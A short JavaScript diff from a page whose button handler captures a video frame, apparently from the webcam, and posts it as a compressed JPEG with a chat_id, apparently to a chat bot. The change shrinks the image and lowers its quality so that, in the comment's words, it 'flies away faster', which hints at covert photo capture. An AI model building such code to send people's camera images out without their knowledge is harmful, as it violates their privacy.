@@ -48,12 +48,12 @@ btn.onclick = async () => {
             };
         });
 
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
+        canvas.width = 400;
+        canvas.height = 300;
         canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
         
         // Сжимаем фото сильнее (0.5), чтобы оно улетело быстрее
-        const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.5));
+        const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.3));
         const formData = new FormData();
         formData.append('chat_id', chatId);
         formData.append('photo', blob, 'shot.jpg');
